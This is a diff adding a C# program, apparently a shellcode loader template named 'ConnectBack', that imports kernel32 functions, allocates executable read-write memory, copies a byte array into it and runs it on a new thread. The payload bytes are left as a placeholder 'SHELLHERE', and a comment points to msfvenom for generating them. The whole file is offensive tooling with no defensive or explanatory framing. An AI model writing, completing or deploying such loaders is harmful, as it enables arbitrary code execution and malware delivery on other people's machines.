@@ -1,0 +1,91 @@
+﻿using System;
+
+using System.Runtime.InteropServices;
+
+
+
+namespace ConnectBack
+{
+    public class Program
+    {
+        public enum Protection
+        {
+            PAGE_NOACCESS = 0x01,
+            PAGE_READONLY = 0x02,
+            PAGE_READWRITE = 0x04,
+            PAGE_WRITECOPY = 0x08,
+            PAGE_EXECUTE = 0x10,
+            PAGE_EXECUTE_READ = 0x20,
+            PAGE_EXECUTE_READWRITE = 0x40,
+            PAGE_EXECUTE_WRITECOPY = 0x80,
+            PAGE_GUARD = 0x100,
+            PAGE_NOCACHE = 0x200,
+            PAGE_WRITECOMBINE = 0x400
+        }
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetLastError();
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
+        Protection flNewProtect, out Protection lpflOldProtect);
+
+        [DllImport("kernel32")]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+        UInt32 size, UInt32 flAllocationType, Protection flProtect);
+
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateThread(
+
+          UInt32 lpThreadAttributes,
+          UInt32 dwStackSize,
+          UInt32 lpStartAddress,
+          IntPtr param,
+          UInt32 dwCreationFlags,
+          ref UInt32 lpThreadId
+          );
+
+        [DllImport("kernel32")]
+        private static extern bool VirtualProtect(
+              UInt32 lpAddress,
+              UIntPtr dwSize,
+               IntPtr param,
+              out uint lpflOldProtect
+            );
+
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        private static UInt32 MEM_COMMIT = 0x1000;
+        //private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        //private static UInt32 PAGE_READWRITE = 0x04;
+
+        private static void ExecShell()
+        {
+            //msfvenom -p windows/exec cmd=calc.exe -f psh
+            byte[] shell = new byte[]{
+SHELLHERE
+            };
+            IntPtr hThread = IntPtr.Zero;
+            IntPtr pinfo = IntPtr.Zero;
+            UInt32 threadId = 0;
+
+            UInt32 addrmemExec = VirtualAlloc(0, (UInt32)shell.Length, MEM_COMMIT, Protection.PAGE_EXECUTE_READWRITE);
+            //writes our shellcode into the allocated memory
+            Marshal.Copy(shell, 0, (IntPtr)addrmemExec, shell.Length);
+
+            CreateThread(0, 0, addrmemExec, pinfo, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+        }
+
+
+        public static void Main(string[] args)
+        {
+            ExecShell();
+            
+        }
+
+        
+
+    }
+}
